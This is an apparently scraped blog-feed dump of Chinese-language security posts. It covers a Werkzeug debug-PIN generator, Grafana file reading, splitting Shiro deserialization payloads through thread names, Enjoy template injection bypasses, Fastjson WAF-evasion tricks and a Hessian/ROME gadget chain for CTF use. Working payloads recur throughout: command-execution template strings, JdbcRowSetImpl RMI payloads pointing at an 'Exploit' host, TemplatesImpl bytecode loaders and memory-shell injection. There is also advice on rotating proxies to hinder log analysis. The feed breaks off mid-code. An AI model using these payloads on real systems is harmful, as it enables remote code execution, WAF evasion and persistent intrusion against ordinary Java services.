&#123; &quot;cookie&quot;:&quot;session=.eJwVi0EKwyAQAL8ie8mlEE3ArP1MWXdXCE21REsJpX-POcxlhvkB1z09WnlqhjvMkwvKHBktRmfD5J1NKj5EXBDZeppVAi5wg0_VPdNL-7UVEiPUyKw5rZuaYdTG45tq_crQZSumUezhOKRewP8E760nRw.YlqN-g.KZrp8S7tsXPS60cPH88awzRI35Q&quot;&#125;r = requests.get(url+payload1,headers=headers)r = requests.get(url+payload2,headers=headers)probably_public_bits = [ &#x27;ctf&#x27;# /etc/passwd &#x27;flask.app&#x27;,# 默认值 &#x27;Flask&#x27;,# 默认值 &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到]private_bits = [ str(int(re.search(&#x27;&lt;/h1&gt;&lt;pstyle=&quot;text-align:center&quot;&gt;(.*?)&lt;/p&gt;&lt;/ul&gt;&#x27;,requests.get(url+payload3,headers=headers).text.replace(&quot;\\n&quot;, &quot;&quot;).replace(&quot; &quot;,&quot;&quot;)).groups()[0].replace(&#x27;:&#x27;,&#x27;&#x27;),16)),# /sys/class/net/eth0/address 16进制转10进制 &#x27;1cc402dd0e11d5ae18db04a6de87223d&#x27;+re.search(&#x27;&lt;/h1&gt;&lt;pstyle=&quot;text-align:center&quot;&gt;(.*?)&lt;/p&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/body&gt;&lt;/html&gt;&#x27;,requests.get(url+payload4,headers=headers).text.replace(&quot;\\n&quot;, &quot;&quot;).replace(&quot; &quot;,&quot;&quot;)).groups()[0].split(&quot;,&quot;)[0].split(&quot;/&quot;)[-1]# /etc/machine-id + /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) oh-my-grafana之前被爆有任意文件读，不知道有啥插件简单fuzz一下得到 1/public/plugins/alertGroups/../../../../../../../../etc/passwd 大概看了下文档看看能读些什么配置 先是读了sqlite，dump下来想看看admin密码来着，尝试很多没破解成功，显然是我不懂密码学 不过后面看到了grafana.ini，里面泄漏了，好吧还成功登陆了 后台啥都无，不过有个添加数据源的地方，显然这里被注释了，但是真的链接成功了 后面就是任意执行sql语句拿下了，没啥难度","categories":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/tags/CTF/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"}]},{"title":"浅谈Shiro550受Tomcat Header长度限制影响突破","slug":"year/2022/4/浅谈Shiro550受Tomcat-Header长度限制影响突破","date":"2022-04-14T07:00:55.000Z","updated":"2024-08-04T09:01:49.316Z","comments":true,"path":"2022/04/14/year/2022/4/浅谈Shiro550受Tomcat-Header长度限制影响突破/","link":"","permalink":"https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/","excerpt":"","text":"浅谈Shiro550受Tomcat Header长度限制影响突破0x00 写在前面写个shiro相关的东西，还是秉着写出来才能学的更多的理念，当然个人还是不太喜欢贴上整串代码，只是分享思路心得，在很早以前我学习这个只是想弹出计算器，但是后面自己还是更喜欢折腾实战方面的一些构思(虽然没有过)，在实战中我们更希望得到一个有回显的，而不是只是执行一个命令，关于回显最通用的就是去遍历线程对象中获取request，但是后面发现Tomcat居然有Header长度的限制，接下来就是解决问题 0x01 一些传统思路思路一：修改maxHeaderSize(不太喜欢)首先是在网上参考学习到了Litch1写的文章基于全局储存的新思路 | Tomcat的一种通用回显方法研究 里面提到了去修改org.apache.coyote.http11.AbstractHttp11Protocol中的maxHeaderSize的值，里面通过多个线程发送payload来确保request的inputbuffer会复用，个人觉得不太稳定，另一方面就算构造出来了其实也很长了，在我心中不是最优解 思路二：分离payload+动态类加载 这个思路主要来源于读到开源工具ShiroAttack2里面提到的将payload分离为两个部分(一部分是去触发反序列化Gadget，另一部分是)，我的环境是tomcat8(因此需要遍历线程对象获取request/response便于回显) 这里一个比较骚的点是通过Class自带的方法equals去传递request与response，当然也可以用其他的，这样比较方便 这样我们就成功实现了将payload缩短能获得回显的目的了 0x02 浅谈新思路但是呢，个人并不满足仅仅只是成功，如果某一天在某些框架下让header更短怎么办？这里我主要解决不落地的思路 能不能再将上面的思路二再分离开来来简单实现缩短payload+分散发包 要解决这个那么一定要解决在全局能够持久存储我们的payload的地方，这里我想到了去修改当前线程对象的名字(Thread.currentThread().setName())，测试了下Thread的name能够有足够储存我们长度的能力 经过简单测试发现每次刷新网页这个线程都会改变，但总量就那么几个，那么我们肯定需要通过遍历来筛选 当然为了方便，我先将其中一个设置成我的id:Thread.currentThread().setName(“y4tacker”); 1234567try &#123; ThreadGroup a = Thread.currentThread().getThreadGroup(); java.lang.reflect.Field v2 = a.getClass().getDeclaredField(&quot;threads&quot;); v2.setAccessible(true); Thread[] o = (Thread[]) v2.get(a); for(int i = 0; i &lt; o.length; ++i) &#123;Thread z = o[i];if (z.getName().contains(&quot;y4tacker&quot;))&#123;z.setName(z.getName()+&quot;我是注入的payload&quot;); &#125;&#125;&#125;catch (Exception e)&#123;&#125; 通过一些其他手段缩减payload至最小差不多2400 这样我们只需要将注入的payload分成多段慢慢加入，通过下面的代码来最终触发我们设置向线程的paylaod执行任意代码了 123456try &#123;ThreadGroup a = Thread.currentThread().getThreadGroup();java.lang.reflect.Field v2 = a.getClass().getDeclaredField(&quot;threads&quot;);v2.setAccessible(true);Thread[] o = (Thread[]) v2.get(a);for(int i = 0; i &lt; o.length; ++i) &#123;Thread z = o[i];if (z.getName().contains(&quot;y4&quot;))&#123; byte[] x = org.apache.shiro.codec.Base64.decode(z.getName().replaceAll(&quot;y4tacker&quot;, &quot;&quot;)); java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); ((Class)defineClassMethod.invoke(a.class.getClassLoader(), x, 0, x.length)).newInstance();&#125;&#125;&#125;catch (Exception e)&#123;&#125; 这样还给我们一个好处就是，在每次发包的时候切换代理变更ip，maybe可以导致后台分析日志的时候会更难(毕竟每次发包之间总有其他用户的正常操作XD)，简单测试一下能不能弹个计算器嘞，答案永远是Yes 顺便提醒一句搞完了记得把线程名改回去哦，不然线程名变成啥样勒，plz","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"https://y4tacker.github.io/tags/Shiro/"}]},{"title":"Enjoy模板引擎分析","slug":"year/2022/4/Enjoy模板引擎分析","date":"2022-04-14T04:15:23.000Z","updated":"2024-08-04T09:01:49.259Z","comments":true,"path":"2022/04/14/year/2022/4/Enjoy模板引擎分析/","link":"","permalink":"https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/","excerpt":"","text":"Enjoy模板引擎分析前置首先有关Enjoy模板引擎的一些描述可以看这里：https://jfinal.com/doc/6-1 文档中值得关注的点属性访问触发get方法在官方文档里面我们可以看到很多有趣的东西(当然我会更关注于一些相关的)，比如属性访问的这一条描述，可以让我们去触发对象的get方法(前提是public修饰) 12345由于模板引擎的属性取值表达式极为常用，所以对其在用户体验上进行了符合直觉的扩展，field 表达式取值优先次序，以 user.name 为例：如果 user.getName() 存在，则优先调用如果 user 具有 public 修饰过的name 属性，则取 user.name 属性值（注意：jfinal 4.0 之前这条规则的优先级最低） 方法调用关于方法调用也有一些描述，说可以直接调用对象上的任何public方法，使用规则与java中调用方式保持一致，当然也不是所有方法都能调用，在源码的调试过程当中发现有一些方法在黑名单当中 1234567891011121314151617getClasswaitnotifyAllgetClassLoaderinvokenotifygetDeclaringClassremoveForbiddenMethodremoveForbiddenClasssuspendresumeloadLibraryforNamenewInstanceexithaltstop 除此以外也有黑名单类 123456789101112131415161718java.lang.ThreadGroupjava.lang.ProcessBuilderjava.lang.Systemjava.lang.ClassLoaderjava.lang.reflect.Proxyjava.lang.Runtimejava.lang.Threadjava.lang.Classcom.jfinal.template.expr.ast.MethodKitjava.io.Filejava.lang.reflect.Methodjava.lang.InheritableThreadLocaljava.lang.Processjava.lang.ThreadLocaljava.lang.Packagejava.lang.SecurityManagerjava.lang.Compilerjava.lang.RuntimePermission 因此也给了我们更多的限制 静态属性访问来个例子就懂了 123#if(x.status == com.demo.common.model.Account::STATUS_LOCK_ID) &lt;span&gt;(账号已锁定)&lt;/span&gt;#end 静态方法的调用123#if(com.jfinal.kit.StrKit::isBlank(title)) ....#end 同时支持调用静态属性上的方法 1(com.jfinal.MyKit::me).method(paras) 引擎执行流程简单分析以下不感兴趣可以直接略过，因为不需要一些很详细的分析就能bypass，只要我们知道过滤了哪些类哪些方法针对绕过即可，这里权当自己好奇看看如何实现的，当然分析也只会主要去看一些能让我成功实现执行不安全函数的方式(指的是#()与#set()两种)，根据对文档的阅读，个人认为其他标签对于我意义不大，因为我如果能够执行一个命令我需要的是能够回显#()，或者我不能通过一步执行需要通过#set(a=xxx)的方式去拆分保存变量做中转，因此我在分析调试的过程当中只会针对这两个标签进行分析 为了独立分析这里引入了maven坐标 12345&lt;dependency&gt; &lt;groupId&gt;com.jfinal&lt;/groupId&gt; &lt;artifactId&gt;enjoy&lt;/artifactId&gt; &lt;version&gt;4.9.21&lt;/version&gt;&lt;/dependency&gt; 一个基本的使用很简单，为了方便调试我写了个很简单的类 123456789101112package com.example.ezsb;public class User &#123; public static void run()&#123; try&#123; Runtime.getRuntime().exec(&quot;open -na Calculator&quot;); &#125;catch (Exception e)&#123; &#125; &#125;&#125; 12Template template = engine.getTemplateByString(&quot;#(com.example.ezsb.User::run())&quot;);template.renderToString(); 首先由于默认未开启缓存，默认走第一个分支 接下来我们看com.jfinal.template.Engine#buildTemplateBySource,同样我们只需要更关注于解析部分也就是parser.parse() 接下来我们先跟一下这个遍历字符串解析token的过程，首先是初步解析操作与内容，比如#(xxx)他就会识别成OUTPUT xxxx )三部分，#set(&quot;a=xxx&quot;)也会拆分成set a=xxx )三部分之后在statlist中，根据是TEXT\\SET\\FOR\\OUTPUT\\INCLUDE\\FOR\\DEFINE\\CALL.....等去做更进一步的解析 这里我们看看,首先当前位置一定是#，不然也没意义了，这里光看英文单词就知道我们更应该专注看com.jfinal.template.stat.Lexer#scanDire 这里如果#后面是(也就直接对应了OUTPUT，如果不是则判断后面如果是字母则转到state为10的分支（PS：后面那个如果是@则调用模板函数防止你们好奇），并设置对应的token 接下来我们看看state为10的地方做的什么首先通过id去获取symbol 简单看看这里一些内置的东西，如果没有的话就会去看是不是走define或者else if分支，当然超纲了我上面说过的只看#()和#set()，这里就不深入谈了 接下来看debug窗口就和我们上面说的一样设置了下面的toknelist的内容 接下来我们继续看看statList函数(在上一步的基础上进行更进一步的解析)，这里不管是OUTPUT还是SET其实值得我们关注的核心调用是相同的，也就是this.parseExprList(para) 跟进parseExprList，一直到com.jfinal.template.expr.ExprParser#parse，我们跟进这个scan 这里不再通篇像上面那样说如何解析的了，有兴趣可以自己看 这里我们只看几个关键的，在scanOperator里面，一个是::作为STATIC静态标记，另一个是左括号和又括号 在最终做完这些处理后，tokenList成了这个样子 接下来我们看看下面，首先initPeek会将peek设置为tokenList当中的第一个，之后默认会调用exprList 123456789101112131415Expr parse(boolean isExprList) &#123; this.tokenList = (new ExprLexer(this.paraToken, this.location)).scan(); if (this.tokenList.size() == 0) &#123; return ExprList.NULL_EXPR_LIST; &#125; else &#123; this.tokenList.add(EOF); this.initPeek(); Expr expr = isExprList ? this.exprList() : this.forCtrl(); if (this.peek() != EOF) &#123; throw new ParseException(&quot;Expression error: can not match \\&quot;&quot; + this.peek().value() + &quot;\\&quot;&quot;, this.location); &#125; else &#123; return (Expr)expr; &#125; &#125;&#125; 在exprList,具体的过程也比较复杂 12345678910111213141516171819202122ExprList exprList() &#123; ArrayList exprList = new ArrayList(); while(true) &#123; Expr expr = this.expr(); if (expr == null) &#123; break; &#125; exprList.add(expr); if (this.peek().sym != Sym.COMMA) &#123; break; &#125; this.move(); if (this.peek() == EOF) &#123; throw new ParseException(&quot;Expression error: can not match the char of comma &#x27;,&#x27;&quot;, this.location); &#125; &#125; return new ExprList(exprList); &#125; 这里放一个调用栈就好了，有兴趣可以自己跟一跟(它规定了以什么样的顺序去解析我们的表达式) 123456789101112131415161718192021222324staticMember:326, ExprParser (com.jfinal.template.expr)incDec:287, ExprParser (com.jfinal.template.expr)unary:279, ExprParser (com.jfinal.template.expr)nullSafe:253, ExprParser (com.jfinal.template.expr)mulDivMod:241, ExprParser (com.jfinal.template.expr)addSub:229, ExprParser (com.jfinal.template.expr)greaterLess:216, ExprParser (com.jfinal.template.expr)equalNotEqual:203, ExprParser (com.jfinal.template.expr)and:191, ExprParser (com.jfinal.template.expr)or:179, ExprParser (com.jfinal.template.expr)ternary:165, ExprParser (com.jfinal.template.expr)assign:158, ExprParser (com.jfinal.template.expr)expr:127, ExprParser (com.jfinal.template.expr)exprList:110, ExprParser (com.jfinal.template.expr)parse:97, ExprParser (com.jfinal.template.expr)parseExprList:76, ExprParser (com.jfinal.template.expr)parseExprList:269, Parser (com.jfinal.template.stat)stat:117, Parser (com.jfinal.template.stat)statList:87, Parser (com.jfinal.template.stat)parse:77, Parser (com.jfinal.template.stat)buildTemplateBySource:305, Engine (com.jfinal.template)getTemplateByString:242, Engine (com.jfinal.template)getTemplateByString:223, Engine (com.jfinal.template)main:50, Test (com.example.ezsb) 最终在staticMember会返回一个实例化的staticMember对象 在初始化的时候还会检查类名与方法名是否在黑名单当中，具体的在上面提到过就不贴了点我直达 后面过程就省略了，已经到了我们想要的了，后面就是如何调用这个静态函数了，当然其实不止能调用静态方法，还可以直接调用实例对象的方法，但是也是有黑名单拦截 绕过Bypass根据之前的调试我们知道，如果想要在模板里面执行函数有几个条件 对于调用静态方法，只能调用公共静态方法(但不能用黑名单当中的类以及方法) 对于实例对象的方法，只能调用public修饰的(但不能用黑名单当中的类以及方法) 绕过第一个方式直接命令执行比较难，那么如果是第二种方式的话那我们肯定需要获取一个类的实例，那么有没有一个public类的静态方法能返回我们任意的实例呢，那就看看有没有办法能够返回一个类的实例呢？这样就可以 javax.script.ScriptEngineManager来执行任意Java代码(这样也比较好绕过黑名单了) 首先网上搜了搜jfinal的历史，发现可以通过fastjson去实例化一个类，同时可以开启autotype，构造payload长这样 1234567#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance())#(x.setAutoTypeSupport(true))#(x.addAccept(&quot;javax.script.ScriptEngineManager&quot;))#set(a=com.alibaba.fastjson.JSON::parse(&#x27;&#123;&quot;@type&quot;:&quot;javax.script.ScriptEngineManager&quot;&#125;&#x27;))#set(b=a.getEngineByName(&#x27;js&#x27;))#set(payload=xxxxxx)#(b.eval(payload)) 既然这样那有没有jre当中的类可以实现类似的效果呢？答案是有 Java自带类绕过我发现有一个类java.beans.Beans 123public static Object instantiate(ClassLoader cls, String beanName) throws IOException, ClassNotFoundException &#123; return Beans.instantiate(cls, beanName, null, null);&#125; 这个方法又臭又长，不过好在符合条件classLoader也不需要传，真舒服呀 12345678if (cls == null) &#123; try &#123; cls = ClassLoader.getSystemClassLoader(); &#125; catch (SecurityException ex) &#123; // We&#x27;re not allowed to access the system class loader. // Drop through. &#125;&#125; 因此配合这个类顺手拿下模板SSTI 1#set((java.beans.Beans::instantiate(null,&quot;javax.script.ScriptEngineManager&quot;)).getEngineByExtension(&quot;js&quot;).eval(&quot;function test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(\\&quot;open -na Calculator\\&quot;)&quot;)) 获取回显我们考虑两个场景，一个是直接执行，另一个return返回值 写入内存马既然能够执行任意代码了那肯定拿下内存马，这里启一个springboot环境测试，简单测试下 12345678910111213@ResponseBody@RequestMapping(&quot;/&quot;)public String abc(@RequestParam(&quot;base&quot;) String base) &#123; ProcessBuilder processBuilder = new ProcessBuilder(); Engine engine = Engine.use(); engine.setDevMode(true); engine.setToClassPathSourceFactory(); Template template = engine.getTemplateByString(base); String result = template.renderToString(); return result;&#125; 直接回显很简单不需要讲了都，很常规payload 1base=#((java.beans.Beans::instantiate(null,&quot;javax.script.ScriptEngineManager&quot;)).getEngineByExtension(&quot;js&quot;).eval(&quot;var s = [3];s[0] = \\&quot;/bin/bash\\&quot;;s[1] =\\&quot;-c\\&quot;;s[2] = \\&quot;id\\&quot;;var p =java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\\&quot;GBK\\&quot;).useDelimiter(\\&quot;\\\\A\\&quot;);var result = sc.hasNext() ? sc.next() : \\&quot;\\&quot;;sc.close();result;&quot;)) 测试下","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Enjoy模板","slug":"Enjoy模板","permalink":"https://y4tacker.github.io/tags/Enjoy%E6%A8%A1%E6%9D%BF/"}]},{"title":"浅谈Fastjson绕waf","slug":"year/2022/3/浅谈Fastjson绕waf","date":"2022-03-30T06:36:29.000Z","updated":"2024-08-04T09:01:49.203Z","comments":true,"path":"2022/03/30/year/2022/3/浅谈Fastjson绕waf/","link":"","permalink":"https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/","excerpt":"","text":"浅谈Fastjson绕waf写在前面​ 关键时期换个口味，虽然是炒陈饭，但个人认为有干货的慢慢看，从最简单到一些个人认为比较骚的，本人垃圾代码狗，没有实战经验，因而更多是从fastjson的词法解析部分构造混淆 初级篇添加空白字符在com.alibaba.fastjson.parser.JSONLexerBase#skipWhitespace 12345678910111213141516171819public final void skipWhitespace() &#123; while(true) &#123; while(true) &#123; if (this.ch &lt;= &#x27;/&#x27;) &#123; if (this.ch == &#x27; &#x27; || this.ch == &#x27;\\r&#x27; || this.ch == &#x27;\\n&#x27; || this.ch == &#x27;\\t&#x27; || this.ch == &#x27;\\f&#x27; || this.ch == &#x27;\\b&#x27;) &#123; this.next(); continue; &#125; if (this.ch == &#x27;/&#x27;) &#123; this.skipComment(); continue; &#125; &#125; return; &#125; &#125; &#125; 不难看出默认会去除键、值外的空格、\\b、\\n、\\r、\\f等，作为开胃菜 默认开启的Feature中得到的思路添加多个逗号FastJson中有个默认的Feature是开启的AllowArbitraryCommas，这允许我们用多个逗号 这里可以添加的位置很多 1&#123;,,,,,,&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,,,,,,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;,,,,,, &quot;autoCommit&quot;:true&#125; json字段名不被引号包括也是一个默认开启的Feature，AllowUnQuotedFieldNames，但是只在恢复字段的过程调用当中有效果 因此原来的payload可以做此改造 1234&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;||\\/&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,dataSourceName:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; json字段名使⽤单引号包裹Feature.AllowSingleQuote也是默认开启滴，这个太简单了就不说了 @type后的值第一个引号可以替换为其他字符主要是一个逻辑问题 这里我们可以对比之前获取@type的过程，先检验了当前位置是&quot;再扫描到下一个&quot;之间的值 123456if (ch == &#x27;&quot;&#x27;) &#123; key = lexer.scanSymbol(this.symbolTable, &#x27;&quot;&#x27;); lexer.skipWhitespace(); ch = lexer.getCurrent();//省略不必要代码&#125; 因此可以构造出,注意com前面的引号被我改了,&#123;&quot;@type&quot;:xcom.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; 编码绕过(Unicode/Hex)首先在com.alibaba.fastjson.parser.JSONLexerBase#scanSymbol,当中可以看见，如果遇到了\\u或者\\x会有解码操作 还可以混合编码，这里一步到位 1&#123;&quot;\\x40\\u0074\\u0079\\u0070\\u0065&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; 对字段添加多个下划线或者减号1.2.36版本前在com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField 解析字段的key的时候，调用了smartMatch，下面截了与本主题相关的关键点 由于这里有break，不支持两个一起混合使用，只能单一使用其中一个，随便加 1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&#x27;d_a_t_aSourceName&#x27;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; 1.2.36版本及以后我们再来看这个smartMatch调用了com.alibaba.fastjson.util.TypeUtils#fnv1a_64_lower 这个函数忽略所有的_与- 因此简单测试，lol 1.2.36版本后可以对属性前添加is在那个基础上,还是在smartMatch当中可以看见，如果前缀有is，会去掉is 1&#123;&quot;a&quot;: &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;: &#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;isdataSourceName&quot;: &quot;rmi://127.0.0.1:1099/Exploit&quot;,&quot;isautoCommit&quot;: true&#125;&#125; 高级篇自己瞎想出来的哈哈哈，假装很高级吧 注释加强版绕过我在想如果假如有waf逻辑会为了方便先将接受到的字符串的去除注释符之间的部分再去匹配，比如下面的伪代码 1preg_replace(&quot;(/\\*(.*?)\\*/)&quot;,&quot;&quot;,&#x27;/*y4tacker*/&#123;/*y4tacker*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;&#x27;); 处理前：/*y4tacker*/&#123;/*y4tacker*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125; 处理后会显得更干脆更好做判断： &#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; 那有没有办法可以让我们将注释符中内容替换以后，没有危险字符嘞，当然有的，先给出答案再解释加上\\u001a /*\\u001a&#123;/*y4tacker*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;*/，这样waf就会将内容替换后识别一串空字符当然就可以绕过，而且JSON数据后⾯可以填充其他不是():[]&#123;&#125;等任意字符，具体可以看com.alibaba.fastjson.parser.JSONLexerBase#nextToken() 那为什么这里\\u001a可以绕过 从代码出发开局初始化DefaultJSONParser的时候，由于我们字符串开头是/，会调用netToken 这里会调用skipComment去除注释 可以看见如果是正常逻辑匹配到*/只是移动到下一字符返回 之后继续处理正常逻辑 题外话fastjson眼中的注释/**/，//y4tacker\\n，具体可以看skipComment的逻辑 因此在支持加注释的地方可以试试添加打乱特征 1//y4tacker\\n&#123;//y4tacker\\n&quot;@type&quot;//y4tacker\\n://y4tacker\\n&quot;com.test.Test&quot;//y4tacker\\n&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"}]},{"title":"2022虎符CTF-Java部分","slug":"year/2022/3/2022虎符CTF-Java部分","date":"2022-03-21T03:00:58.000Z","updated":"2024-08-04T09:01:49.183Z","comments":true,"path":"2022/03/21/year/2022/3/2022虎符CTF-Java部分/","link":"","permalink":"https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/","excerpt":"","text":"2022虎符CTF-Java部分写在前面​ 非小白文，代码基于marshalsec项目基础上进行修改 正文​ 本身我是不太懂hessian的反序列化，大概去网上搜了一下配合ROME利用的思路（如果反序列化map对象，在逻辑后面通过put操作，从而触发对key调用hashCode打ROME），这里不清楚可以看看ROME利用链以及hessian反序列化的一些简单东西 ​ 首先简单看下docker，可以看到会导致不能出网 123456789101112131415161718192021222324252627version: &#x27;2.4&#x27;services: nginx: image: nginx:1.15 ports: - &quot;0.0.0.0:8090:80&quot; restart: always volumes: - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro networks: - internal_network - out_network web: build: ./ restart: always volumes: - ./flag:/flag:ro networks: - internal_networknetworks: internal_network: internal: true ipam: driver: default out_network: ipam: driver: default nginx.conf 12345678910111213141516171819server &#123; listen 80; server_name localhost; location / &#123; root /usr/share/nginx/html; index index.html index.htm; proxy_pass http://web:8090; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125;&#125; 利用一：SignedObject实现二次反序列化既然不出网那就无法配合JNDI去利用了（网上主流的利用），后面尝试了TemplatesImpl，在Hessian的一些限制下(有空自己去看源码)，导致被transient修饰的_tfactory对象无法写入造成空指针异常，为什么呢,自己看图可以看到不仅仅是被transient修饰，同时静态变量也不行，这里导致另一个利用链不能打，这里不提 之后解决思路就是找个二次反序列化的点触发原生反序列化即可，最后找到个java.security.SignedObject#SignedObject,里面的getObject可以触发 1234567891011public Object getObject() throws IOException, ClassNotFoundException&#123; // creating a stream pipe-line, from b to a ByteArrayInputStream b = new ByteArrayInputStream(this.content); ObjectInput a = new ObjectInputStream(b); Object obj = a.readObject(); b.close(); a.close(); return obj;&#125; 这时候聪明的你一定想问，为什么原生反序列化就可以恢复这个trasient修饰的变量呢，答案如下com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#readObject,重写了readOBject方法 因此得到下面简单的payload，下面payload有一些地方还可以完善变得更好，但是我懒 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package marshalsec;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ObjectBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import marshalsec.gadgets.JDKUtil;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.security.*;import java.util.Base64;import java.util.HashMap;import static marshalsec.util.Reflections.setFieldValue;public class Test &#123; public static void main(String[] args) throws Exception &#123; byte[] code = ClassPool.getDefault().get(&quot;Yyds&quot;).toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;abc&quot;); setFieldValue(templates,&quot;_class&quot;,null); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;); ToStringBean bean = new ToStringBean(Templates.class,templates); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1); setFieldValue(badAttributeValueExpException,&quot;val&quot;,bean); KeyPairGenerator keyPairGenerator; keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;); keyPairGenerator.initialize(1024); KeyPair keyPair = keyPairGenerator.genKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); Signature signingEngine = Signature.getInstance(&quot;DSA&quot;); SignedObject so = null; so = new SignedObject(badAttributeValueExpException, privateKey, signingEngine); ObjectBean delegate = new ObjectBean(SignedObject.class, so); ObjectBean root = new ObjectBean(ObjectBean.class, delegate); HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root); ByteArrayOutputStream os = new ByteArrayOutputStream(); Hessian2Output output = new Hessian2Output(os); output.writeObject(map); output.getBytesOutputStream().flush(); output.completeMessage(); output.close(); System.out.println(new String(Base64.getEncoder().encode(os.toByteArray()))); &#125;&#125; 这样就可以实现执行反序列化打TemplatesImpl加载恶意代码了，接下来既然不出网，比较方便的就是去注入内存马 按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过Thread.currentThread()或Thread.getThreads()获取，按照这个思路写就行了 我是懒狗之间暴力替换handler(继承AbstractTranslet实现HttpHandler)，嫌弃麻烦可以自己加路由可以让代码更短，还可以放到静态块防止触发两次，一句话我懒自己改去 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import com.sun.net.httpserver.HttpContext;import com.sun.net.httpserver.HttpExchange;import 